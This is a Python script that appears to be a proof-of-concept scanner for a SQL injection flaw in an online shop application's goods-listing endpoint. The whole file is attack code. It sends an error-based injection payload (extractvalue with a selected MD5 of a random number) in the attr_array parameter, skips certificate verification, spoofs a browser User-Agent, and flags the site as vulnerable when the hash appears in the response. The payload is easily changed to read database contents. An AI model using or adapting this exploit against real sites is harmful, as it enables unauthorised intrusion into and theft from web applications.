import requests,re,urllib3
from hashlib import md5

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
a1=randomInt(200, 900)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8%27)%20and%20extractvalue(1,concat(1,(select%20md5("+str(a1)+")),0x7e))%20and%20(%271%27=%271&spec_array[]=9"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if md5(str(a1).encode()).hexdigest() in response.text:
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
